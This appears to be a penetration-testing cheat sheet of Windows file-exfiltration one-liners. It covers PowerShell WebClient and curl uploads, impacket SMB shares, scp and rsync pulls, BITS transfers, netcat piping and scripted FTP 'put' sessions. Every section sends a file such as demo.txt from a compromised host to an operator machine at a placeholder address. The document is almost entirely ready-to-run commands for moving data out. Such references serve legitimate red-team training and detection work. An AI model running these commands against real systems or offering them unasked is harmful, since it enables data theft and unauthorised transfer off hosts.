USING POWERSHELL -
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', '\users\public\demo.txt')

**Web Content Upload**
    
    powershell.exe -c "curl.exe -T \users\public\demo.txt http://{REMOTE-IP}/demo.txt"

**Web Content Upload**
    
    Start-Process -FilePath "curl.exe" -ArgumentList "-T '\users\public\demo.txt' http://{REMOTE-IP}/demo.txt" -NoNewWindow -Wait
------------------------------------------------------------------------------------------------------------------

</br>

USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Using PUT Method**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt', 'PUT', '\users\public\demo.txt')"   

**Using POST Method**

    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://{REMOTE-IP}/demo.txt','\users\public\demo.txt')"
------------------------------------------------------------------------------------------------------------------

</br>

USING SMB - 
------------------------------------------------------------------------------------------------------------------

**SMB SERVER -**

**Start normal SMB Server**
    
    impacket-smbserver share .

**If version error**
    
    impacket-smbserver -smb2support share .

**Use authenticated servers if file transfer is long**

    impacket-smbserver share -username user -password pass . -smb2support


**SMB CLIENT -**

**To create authenticated session**

    net use \\{LOCAL-IP} /u:"user" "pass"

**Web Content Upload**
    
    copy \users\public\demo.txt \\{LOCAL-IP}\share\
------------------------------------------------------------------------------------------------------------------

</br>

USING SSH - 
------------------------------------------------------------------------------------------------------------------

**SCP-**

**Copy a file from Remote PC to Local PC**
    
    scp user@{REMOTE-IP}:/users/public/demo.txt /tmp/

**Copy a directory from Remote PC to Local PC**

    scp -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**Copy a directory from Remote to Local with RSA key**

    scp -i id_rsa -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**RSYNC-**

**Copy a file from Remote PC to Local PC**
    
    rsync -av user@{REMOTE-IP}:/users/public/demo.txt /tmp/

**Copy a directory from Remote PC to Local PC**

    rsync -r user@{REMOTE-IP}:/users/public/demo/ /tmp/
    
**Copy a directory from Remote to Local with RSA key**

    rsync -av --port 22 -e 'ssh -i id_rsa' -r user@{REMOTE-IP}:/users/public/demo/ /tmp/

------------------------------------------------------------------------------------------------------------------

</br>

USING WinRM - 
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    download demo.txt
------------------------------------------------------------------------------------------------------------------

</br>

USING BITSADMIN - 
------------------------------------------------------------------------------------------------------------------

**Upload a single file from Remote PC to Local PC**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\demo.txt' -Destination 'http://{LOCAL-IP}/demo.txt' -TransferType Upload"

**Upload multiple files from Remote PC to Local PC**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'c:\users\public\demo1.txt', 'c:\users\public\demo2.txt' -Destination 'http://{LOCAL-IP}/demo1.txt', 'http://{LOCAL-IP}/demo2.txt' -TransferType Upload"

**Transfer single file from one directory to another directory**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source '\users\public\demo.txt' -Destination '\users\public\' -TransferType Upload"
------------------------------------------------------------------------------------------------------------------

</br>

USING NC / NETCAT - 
------------------------------------------------------------------------------------------------------------------

**Run NC Server on Local PC**
    
    nc.exe -nlvp 443 > demo.txt

**Run NC Client on Remote PC**
    
    nc -v {LOCAL-IP} 443 < demo.txt
                OR
    type demo.txt | nc.exe -v {LOCAL-IP} 443
------------------------------------------------------------------------------------------------------------------

</br>

USING FTP - 
------------------------------------------------------------------------------------------------------------------

**File Upload**

Replace "demo.txt" with desired file name
    
    echo open {LOCAL-IP} 21 > file.txt
    echo bin>> file.txt
    echo put demo.txt>> file.txt
    echo bye>> file.txt

    ftp -A -v -n -s:file.txt

**One Liner**

    echo open {LOCAL-IP} 21 > file.txt && echo bin>> file.txt && echo put demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt

**Mannualy -**

    ftp
    open {LOCAL-IP} 2121
    put demo.txt

**FTP Authenticated**

Replace "demo.txt" with desired file name
    
    echo open {LOCAL-IP} 21 > file.txt
    echo user test>> file.txt
    echo test>> file.txt
    echo bin>> file.txt
    echo put demo.txt>> file.txt
    echo bye>> file.txt

    ftp -v -n -s:file.txt

**Mannualy -**

    ftp
    open {LOCAL-IP} 2121
    put demo.txt
------------------------------------------------------------------------------------------------------------------
